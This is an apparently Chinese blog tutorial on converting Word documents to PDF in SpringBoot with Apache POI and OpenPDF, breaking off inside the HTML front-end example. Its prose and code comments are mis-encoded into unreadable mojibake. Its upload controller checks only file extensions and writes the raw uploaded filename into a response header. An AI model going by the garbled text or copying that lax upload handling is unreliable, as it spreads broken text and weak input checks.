h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯å°æ‚Ÿã€‚</p>
<h2 data-id="heading-0">Wordåˆ°PDFçš„å¥‡å¹»ä¹‹æ—…</h2>
<p>Wordæ–‡æ¡£å°±åƒä¸ªç©¿ç€ç¡è¡£åœ¨å®¶åŠå…¬çš„ç¨‹åºå‘˜â€”â€”<strong>èˆ’æœä½†æœ‰ç‚¹éšæ„</strong>ã€‚è€ŒPDFå‘¢ï¼Ÿå°±æ˜¯ç©¿ä¸Šè¥¿è£…æ‰“ä¸Šé¢†å¸¦ï¼Œå‡†å¤‡å»å‚åŠ è‘£äº‹ä¼šçš„åŒä¸€äººâ€”â€”<strong>ä¸“ä¸šä¸”çº¹ä¸ä¸åŠ¨</strong>ï¼</p>
<p>è¿™è½¬å˜è¿‡ç¨‹å¥½æ¯”ï¼š</p>
<ol>
<li><strong>Wordæ–‡æ¡£</strong>ï¼šâ€œå“ˆï¼æˆ‘çš„å­—ä½“å¯ä»¥éšä¾¿æ¢ï¼Œè¾¹è·å¯ä»¥éšæ„è°ƒï¼Œå›¾ç‰‡è¿˜èƒ½æ‹–æ¥æ‹–å»~â€</li>
<li><strong>PDF</strong>ï¼šâ€œé—­å˜´ï¼ç°åœ¨å¼€å§‹æˆ‘è¯´äº†ç®—ï¼Œæ¯ä¸ªåƒç´ éƒ½ç»™æˆ‘ç«™å¥½å²—ï¼â€</li>
</ol>
<p>SpringBootå®ç°è¿™ä¸ªè½¬æ¢ï¼Œå°±åƒæ˜¯è¯·äº†ä¸ª<strong>æ–‡æ¡£å˜å½¢é‡‘åˆš</strong>ï¼ŒæŠŠè‡ªç”±æ•£æ¼«çš„Wordé©¯åŒ–æˆçºªå¾‹ä¸¥æ˜çš„PDFå£«å…µã€‚ä¸‹é¢å°±è®©æˆ‘å¸¦ä½ è§è¯è¿™åœºâ€œæ ¼å¼é©¯åŒ–ä»ªå¼â€ï¼</p>
<h2 data-id="heading-1">å‡†å¤‡é˜¶æ®µï¼šè£…å¤‡ä½ çš„â€œå˜å½¢å·¥å…·ç®±â€</h2>
<h3 data-id="heading-2">ç¬¬ä¸€æ­¥ï¼šMavenä¾èµ–å¤§é‡‡è´­</h3>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- pom.xml é‡ŒåŠ å…¥è¿™äº›æ³•å® --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- SpringBootæ ‡å‡†è£…å¤‡ --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
    
    <span class="hljs-comment">&lt;!-- Apache POI - Wordæ–‡æ¡£çš„â€œè¯»å¿ƒæœ¯â€ --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.poi<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>poi<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.2.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.poi<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>poi-ooxml<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.2.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
    
    <span class="hljs-comment">&lt;!-- OpenPDF - PDFçš„â€œæ‰“å°æœºâ€ --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.github.librepdf<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>openpdf<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.3.30<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
    
    <span class="hljs-comment">&lt;!-- æ–‡ä»¶ç±»å‹æ£€æµ‹ - é¿å…æŠŠå›¾ç‰‡å½“Wordå¤„ç† --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tika<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tika-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.7.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span>
</code></pre>
<h3 data-id="heading-3">ç¬¬äºŒæ­¥ï¼šé…ç½®å±æ€§æ–‡ä»¶</h3>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># application.yml</span>
<span class="hljs-attr">word-to-pdf:</span>
  <span class="hljs-attr">upload-dir:</span> <span class="hljs-string">"uploads/"</span>  <span class="hljs-comment"># Wordæ–‡æ¡£ä¸´æ—¶åœé ç«™</span>
  <span class="hljs-attr">output-dir:</span> <span class="hljs-string">"pdf-output/"</span>  <span class="hljs-comment"># PDFæˆå“ä»“åº“</span>
  <span class="hljs-attr">max-file-size:</span> <span class="hljs-string">10MB</span>  <span class="hljs-comment"># åˆ«æƒ³ç”¨ã€Šæˆ˜äº‰ä¸å’Œå¹³ã€‹æ¥è€ƒéªŒæˆ‘</span>
  
<span class="hljs-attr">spring:</span>
  <span class="hljs-attr">servlet:</span>
    <span class="hljs-attr">multipart:</span>
      <span class="hljs-attr">max-file-size:</span> <span class="hljs-string">10MB</span>
      <span class="hljs-attr">max-request-size:</span> <span class="hljs-string">10MB</span>
</code></pre>
<h2 data-id="heading-4">æ ¸å¿ƒä»£ç ï¼šå˜èº«å§ï¼ŒWordå›ï¼</h2>
<h3 data-id="heading-5">1. æ–‡ä»¶ä¸Šä¼ æ§åˆ¶å™¨ï¼ˆæ¥å¾…å‘˜ï¼‰</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.*;
<span class="hljs-keyword">import</span> org.springframework.web.multipart.MultipartFile;
<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;
<span class="hljs-keyword">import</span> java.io.*;

<span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping("/api/doc-transform")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WordToPdfController</span> {
    
    <span class="hljs-meta">@PostMapping("/word-to-pdf")</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">convertWordToPdf</span><span class="hljs-params">(
            <span class="hljs-meta">@RequestParam("file")</span> MultipartFile wordFile,
            HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException {
        
        <span class="hljs-comment">// 1. æ£€æŸ¥æ–‡ä»¶ï¼šåˆ«æƒ³ç”¨çŒ«å’ªå›¾ç‰‡å†’å……Wordæ–‡æ¡£ï¼</span>
        <span class="hljs-keyword">if</span> (!isWordDocument(wordFile)) {
            response.getWriter().write(<span class="hljs-string">"å–‚ï¼è¿™ä¸æ˜¯Wordæ–‡æ¡£ï¼Œåˆ«éª—æˆ‘ï¼"</span>);
            response.setStatus(HttpServletResponse.SC_BAD_REQUEST);
            <span class="hljs-keyword">return</span>;
        }
        
        <span class="hljs-comment">// 2. ä¸´æ—¶å­˜æ”¾Wordæ–‡ä»¶ï¼ˆåƒå®‰æ£€å‰çš„æš‚å­˜ï¼‰</span>
        <span class="hljs-type">File</span> <span class="hljs-variable">tempWordFile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">"temp_"</span> + System.currentTimeMillis() + <span class="hljs-string">".docx"</span>);
        wordFile.transferTo(tempWordFile);
        
        <span class="hljs-comment">// 3. å¼€å§‹å˜å½¢ï¼</span>
        <span class="hljs-type">byte</span>[] pdfBytes = WordToPdfConverter.convert(tempWordFile);
        
        <span class="hljs-comment">// 4. æ¸…ç†ç°åœºï¼ˆåƒç”¨å®Œçš„å˜å½¢é‡‘åˆšæ¢å¤åŸçŠ¶ï¼‰</span>
        tempWordFile.delete();
        
        <span class="hljs-comment">// 5. æŠŠPDFäº¤ç»™ç”¨æˆ·</span>
        response.setContentType(<span class="hljs-string">"application/pdf"</span>);
        response.setHeader(<span class="hljs-string">"Content-Disposition"</span>, 
            <span class="hljs-string">"attachment; filename=\""</span> + 
            wordFile.getOriginalFilename().replace(<span class="hljs-string">".docx"</span>, <span class="hljs-string">".pdf"</span>) + <span class="hljs-string">"\""</span>);
        response.getOutputStream().write(pdfBytes);
        
        System.out.println(<span class="hljs-string">"è½¬æ¢æˆåŠŸï¼åˆä¸€ä¸ªWordè¢«æˆåŠŸé©¯åŒ–æˆPDFï¼"</span>);
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isWordDocument</span><span class="hljs-params">(MultipartFile file)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">fileName</span> <span class="hljs-operator">=</span> file.getOriginalFilename().toLowerCase();
        <span class="hljs-keyword">return</span> fileName.endsWith(<span class="hljs-string">".docx"</span>) || fileName.endsWith(<span class="hljs-string">".doc"</span>);
    }
}
</code></pre>
<h3 data-id="heading-6">2. è½¬æ¢å™¨æ ¸å¿ƒï¼ˆçœŸæ­£çš„å˜å½¢å¼•æ“ï¼‰</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.apache.poi.xwpf.usermodel.*;
<span class="hljs-keyword">import</span> com.lowagie.text.*;
<span class="hljs-keyword">import</span> com.lowagie.text.pdf.PdfWriter;
<span class="hljs-keyword">import</span> java.io.*;

<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WordToPdfConverter</span> {
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] convert(File wordFile) <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">pdfOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();
        
        <span class="hljs-keyword">try</span> (<span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(wordFile)) {
            <span class="hljs-comment">// 1. æ‰“å¼€Wordæ–‡æ¡£ï¼ˆåƒæ‰“å¼€æ½˜å¤šæ‹‰é­”ç›’ï¼‰</span>
            <span class="hljs-type">XWPFDocument</span> <span class="hljs-variable">document</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XWPFDocument</span>(fis);
            
            <span class="hljs-comment">// 2. åˆ›å»ºPDFæ–‡æ¡£ï¼ˆå‡†å¤‡æ–°å®¶ï¼‰</span>
            <span class="hljs-type">Document</span> <span class="hljs-variable">pdfDocument</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Document</span>();
            PdfWriter.getInstance(pdfDocument, pdfOutputStream);
            pdfDocument.open();
            
            <span class="hljs-comment">// 3. é€æ®µæ¬è¿å†…å®¹ï¼ˆåƒèš‚èšæ¬å®¶ï¼‰</span>
            System.out.println(<span class="hljs-string">"å¼€å§‹æ¬è¿æ®µè½ï¼Œå…±"</span> + document.getParagraphs().size() + <span class="hljs-string">"æ®µ..."</span>);
            
            <span class="hljs-keyword">for</span> (XWPFParagraph para : document.getParagraphs()) {
                <span class="hljs-keyword">if</span> (para.getText().trim().isEmpty()) <span class="hljs-keyword">continue</span>;
                
                <span class="hljs-comment">// å¤„ç†æ–‡æœ¬æ ·å¼</span>
                <span class="hljs-type">Font</span> <span class="hljs-variable">font</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Font</span>();
                <span class="hljs-keyword">if</span> (para.getStyle() != <span class="hljs-literal">null</span>) {
                    <span class="hljs-keyword">switch</span> (para.getStyle()) {
                        <span class="hljs-keyword">case</span> <span class="hljs-string">"Heading1"</span>:
                            font = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Font</span>(Font.HELVETICA, <span class="hljs-number">18</span>, Font.BOLD);
                            <span class="hljs-keyword">break</span>;
                        <span class="hljs-keyword">case</span> <span class="hljs-string">"Heading2"</span>:
                            font = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Font</span>(Font.HELVETICA, <span class="hljs-number">16</span>, Font.BOLD);
                            <span class="hljs-keyword">break</span>;
                        <span class="hljs-keyword">default</span>:
                            font = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Font</span>(Font.HELVETICA, <span class="hljs-number">12</span>, Font.NORMAL);
                    }
                }
                
                <span class="hljs-type">Paragraph</span> <span class="hljs-variable">pdfPara</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Paragraph</span>(para.getText(), font);
                pdfDocument.add(pdfPara);
                pdfDocument.add(Chunk.NEWLINE);  <span class="hljs-comment">// åŠ ä¸ªæ¢è¡Œï¼Œå–˜å£æ°”</span>
            }
            
            <span class="hljs-comment">// 4. å¤„ç†å›¾ç‰‡ï¼ˆæœ€éš¾æ¬å®¶çš„éƒ¨åˆ†ï¼‰</span>
            System.out.println(<span class="hljs-string">"å¼€å§‹å¤„ç†å›¾ç‰‡ï¼Œå…±"</span> + document.getAllPictures().size() + <span class="hljs-string">"å¼ ..."</span>);
            <span class="hljs-keyword">for</span> (XWPFPictureData picture : document.getAllPictures()) {
                <span class="hljs-keyword">try</span> {
                    <span class="hljs-type">byte</span>[] pictureData = picture.getData();
                    <span class="hljs-type">Image</span> <span class="hljs-variable">image</span> <span class="hljs-operator">=</span> Image.getInstance(pictureData);
                    image.scaleToFit(<span class="hljs-number">500</span>, <span class="hljs-number">500</span>);  <span class="hljs-comment">// ç»™å›¾ç‰‡ä¸Šä¸ªç´§ç®å’’ï¼Œåˆ«å¤ªå¤§</span>
                    image.setAlignment(Element.ALIGN_CENTER);
                    pdfDocument.add(image);
                    pdfDocument.add(Chunk.NEWLINE);
                } <span class="hljs-keyword">catch</span> (Exception e) {
                    System.err.println(<span class="hljs-string">"å›¾ç‰‡"</span> + picture.getFileName() + <span class="hljs-string">"å¤ªè°ƒçš®ï¼Œè½¬æ¢å¤±è´¥: "</span> + e.getMessage());
                }
            }
            
            <span class="hljs-comment">// 5. å¤„ç†è¡¨æ ¼ï¼ˆExcelè¡¨ç¤ºï¼šæˆ‘ä¹Ÿæƒ³æ¥å‡‘çƒ­é—¹ï¼‰</span>
            <span class="hljs-keyword">for</span> (XWPFTable table : document.getTables()) {
                com.lowagie.text.<span class="hljs-type">Table</span> <span class="hljs-variable">pdfTable</span> <span class="hljs-operator">=</span> 
                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">com</span>.lowagie.text.Table(table.getNumberOfRows());
                
                <span class="hljs-keyword">for</span> (XWPFTableRow row : table.getRows()) {
                    <span class="hljs-keyword">for</span> (XWPFTableCell cell : row.getTableCells()) {
                        pdfTable.addCell(cell.getText());
                    }
                }
                pdfDocument.add(pdfTable);
            }
            
            pdfDocument.close();
            document.close();
            
            System.out.println(<span class="hljs-string">"è½¬æ¢å®Œæˆï¼ç”ŸæˆPDFå¤§å°: "</span> + 
                (pdfOutputStream.size() / <span class="hljs-number">1024</span>) + <span class="hljs-string">" KB"</span>);
            
        } <span class="hljs-keyword">catch</span> (Exception e) {
            System.err.println(<span class="hljs-string">"è½¬æ¢è¿‡ç¨‹å‡ºç°æ„å¤–: "</span> + e.getMessage());
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IOException</span>(<span class="hljs-string">"è½¬æ¢å¤±è´¥ï¼ŒWordæ–‡æ¡£å¯èƒ½è¢«æ–½äº†é­”æ³•"</span>, e);
        }
        
        <span class="hljs-keyword">return</span> pdfOutputStream.toByteArray();
    }
}
</code></pre>
<h3 data-id="heading-7">3. å¼‚å¸¸å¤„ç†ï¼ˆå˜å½¢å¤±è´¥çš„æ•‘æŠ¤è½¦ï¼‰</h3>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-meta">@ControllerAdvice</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DocumentConversionExceptionHandler</span> {
    
    <span class="hljs-meta">@ExceptionHandler</span>(<span class="hljs-type">IOException</span>.class)
    <span class="hljs-keyword">public</span> <span class="hljs-type">ResponseEntity</span>&lt;<span class="hljs-type">String</span>&gt; handleIOException(<span class="hljs-type">IOException</span> e) {
        <span class="hljs-keyword">return</span> <span class="hljs-type">ResponseEntity</span>.status(<span class="hljs-type">HttpStatus</span>.<span class="hljs-type">INTERNAL_SERVER_ERROR</span>)
            .body(<span class="hljs-string">"æ–‡æ¡£è½¬æ¢å¤±è´¥ï¼Œå¯èƒ½åŸå› ï¼š<span class="hljs-subst">\n</span>"</span> <span class="hljs-operator">+</span>
                  <span class="hljs-string">"1. Wordæ–‡æ¡£è¢«å¤–æ˜ŸäººåŠ å¯†äº†<span class="hljs-subst">\n</span>"</span> <span class="hljs-operator">+</span>
                  <span class="hljs-string">"2. æ–‡ä»¶å¤ªå¤§ï¼ŒæœåŠ¡å™¨ä¸¾ä¸åŠ¨äº†<span class="hljs-subst">\n</span>"</span> <span class="hljs-operator">+</span>
                  <span class="hljs-string">"3. ç½‘ç»œè¿æ¥åœ¨æ‰“çŒç¡<span class="hljs-subst">\n</span>"</span> <span class="hljs-operator">+</span>
                  <span class="hljs-string">"é”™è¯¯è¯¦æƒ…: "</span> <span class="hljs-operator">+</span> e.getMessage());
    }
    
    <span class="hljs-meta">@ExceptionHandler</span>(<span class="hljs-type">InvalidFormatException</span>.class)
    <span class="hljs-keyword">public</span> <span class="hljs-type">ResponseEntity</span>&lt;<span class="hljs-type">String</span>&gt; handleInvalidFormat(<span class="hljs-type">Exception</span> e) {
        <span class="hljs-keyword">return</span> <span class="hljs-type">ResponseEntity</span>.badRequest()
            .body(<span class="hljs-string">"å–‚ï¼ä½ ä¸Šä¼ çš„æ˜¯Wordæ–‡æ¡£å—ï¼Ÿ<span class="hljs-subst">\n</span>"</span> <span class="hljs-operator">+</span>
                  <span class="hljs-string">"æˆ‘çŒœä½ ä¸Šä¼ çš„æ˜¯ï¼š<span class="hljs-subst">\n</span>"</span> <span class="hljs-operator">+</span>
                  <span class="hljs-string">"â–¡ çŒ«å’ªå›¾ç‰‡ <span class="hljs-subst">\n</span>"</span> <span class="hljs-operator">+</span>
                  <span class="hljs-string">"â–¡ Excelè¡¨æ ¼ <span class="hljs-subst">\n</span>"</span> <span class="hljs-operator">+</span>
                  <span class="hljs-string">"â–¡ å¿ƒçµé¸¡æ±¤æ–‡æœ¬ <span class="hljs-subst">\n</span>"</span> <span class="hljs-operator">+</span>
                  <span class="hljs-string">"è¯·ä¸Šä¼ æ­£ç»çš„.docxæˆ–.docæ–‡ä»¶ï¼"</span>);
    }
}
</code></pre>
<h3 data-id="heading-8">4. è¿›åº¦ç›‘æ§ï¼ˆå˜å½¢è¿‡ç¨‹ç›´æ’­ï¼‰</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConversionProgressService</span> {
    
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">String</span>, <span class="hljs-title class_">Integer</span>&gt; progressMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;&gt;();
    
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">startConversion</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> fileId</span>) {
        progressMap.<span class="hljs-title function_">put</span>(fileId, <span class="hljs-number">0</span>);
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"å¼€å§‹è½¬æ¢æ–‡ä»¶: "</span> + fileId);
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">updateProgress</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> fileId, int percent</span>) {
        progressMap.<span class="hljs-title function_">put</span>(fileId, percent);
        
        <span class="hljs-comment">// æ‰“å°è¿›åº¦æ¡ï¼ˆå‡è£…å¾ˆé«˜çº§ï¼‰</span>
        <span class="hljs-title class_">StringBuilder</span> progressBar = <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">"["</span>);
        <span class="hljs-keyword">for</span> (int i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">20</span>; i++) {
            progressBar.<span class="hljs-title function_">append</span>(i * <span class="hljs-number">5</span> &lt; percent ? <span class="hljs-string">"â–ˆ"</span> : <span class="hljs-string">"â–‘"</span>);
        }
        progressBar.<span class="hljs-title function_">append</span>(<span class="hljs-string">"] "</span>).<span class="hljs-title function_">append</span>(percent).<span class="hljs-title function_">append</span>(<span class="hljs-string">"%"</span>);
        
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(fileId + <span class="hljs-string">" è½¬æ¢è¿›åº¦: "</span> + progressBar.<span class="hljs-title function_">toString</span>());
        
        <span class="hljs-comment">// è¯´ç‚¹éªšè¯é¼“åŠ±ä¸€ä¸‹</span>
        <span class="hljs-keyword">if</span> (percent == <span class="hljs-number">50</span>) {
            <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"è½¬æ¢è¿‡åŠï¼ŒåšæŒä½ï¼"</span>);
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (percent == <span class="hljs-number">90</span>) {
            <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"é©¬ä¸Šå®Œæˆï¼Œå‡†å¤‡å‘å°„PDFï¼"</span>);
        }
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">completeConversion</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> fileId</span>) {
        progressMap.<span class="hljs-title function_">remove</span>(fileId);
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(fileId + <span class="hljs-string">" è½¬æ¢å®Œæˆï¼Œæ·±è—åŠŸä¸å~"</span>);
    }
}
</code></pre>
<h2 data-id="heading-9">å‰ç«¯è°ƒç”¨ç¤ºä¾‹ï¼ˆç”¨æˆ·æ“ä½œç•Œé¢ï¼‰</h2>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Wordè½¬PDFå˜å½¢å·¥åŠ<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
        <span class="hljs-selector-tag">body</span> { <span class="hljs-attribute">font-family</span>: <span class="hljs-string">'Comic Sans MS'</span>, cursive; <span class="hljs-attribute">padding</span>: <span class="hljs-number">20px</span>; }
        <span class="hljs-selector-class">.container</span> { <span class="hljs-attribute">max-width</span>: <span class="hljs-number">600px</span>; <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span> auto; }
        <span class="hljs-selector-class">.drop-zone</span> {
            <span class="hljs-attribute">border</span>: <span class="hljs-number">3px</span> dashed <span class="hljs-number">#4CAF50</span>;
            <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">10px</span>;
            <span class="hljs-attribute">padding</span>: <span class="hljs-number">40px</span>;
            <span class="hljs-attribute">text-align</span>: center;
            <span class="hljs-attribute">background</span>: <span class="hljs-number">#f9f9f9</span>;
            <span class="hljs-attribute">cursor</span>: pointer;
        }
        <span class="hljs-selector-class">.drop-zone</span><span class="hljs-selector-pseudo">:hover</span> { <span class="hljs-attribute">background</span>: <span class="hljs-number">#e8f5e9</span>; }
        <span class="hljs-selector-class">.convert-btn</span> {
            <span class="hljs-attribute">background</span>: <span class="hljs-built_in">linear-gradient</span>(<span class="hljs-number">45deg</span>, <span class="hljs-number">#FF6B6B</span>, <span class="hljs-number">#4ECDC4</span>);
            <span class="hljs-attribute">color</span>: white;
            <span class="hljs-attribute">border</span>: none;
            <span class="hljs-attribute">padding</span>: <span class="hljs-number">15px</span> <span class="hljs-number">30px</span>;
            <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">25px</span>;
            <span class="hljs-attribute">font-size</span>: <span class="hljs-number">18px</span>;
            <span class="hljs-attribute">cursor</span>: pointer;
            <span class="hljs-attribute">margin-top</span>: <span class="hljs-number">20px</span>;
        }
        <span class="hljs-selector-class">.progress-bar</span> {
            <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;
            <span class="hljs-attribute">height</span>: <span class="hljs-number">20px</span>;
            <span class="hljs-attribute">background</span>: <span class="hljs-number">#ddd</span>;
            <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">10px</span>;
            <span class="hljs-attribute">margin-top</span>: <span class="hljs-number">20px</span>;
            <span class="hljs-attribute">overflow</span>: hidden;
            <span class="hljs-attribute">display</span>: none;
        }
        <span class="hljs-selector-class">.progress-fill</span> {
            <span class="hljs-attribute">height</span>: <span class="hljs-number">100%</span>;
            <span class="hljs-attribute">background</span>: <span class="hljs-built_in">linear-gradient</span>(<span class="hljs-number">90deg</span>, <span class="hljs-number">#4CAF50</span>, <span class="hljs-number">#8BC34A</span>);
            <span class="hljs-attribute">width</span>: <span class="hljs-number">0%</span>;
            <span class="hljs-attribute">transition</span>: width <span class="hljs-number">0.3s</span>;
        }
    </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Wordè½¬PDFå˜å½¢å·¥åŠ<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
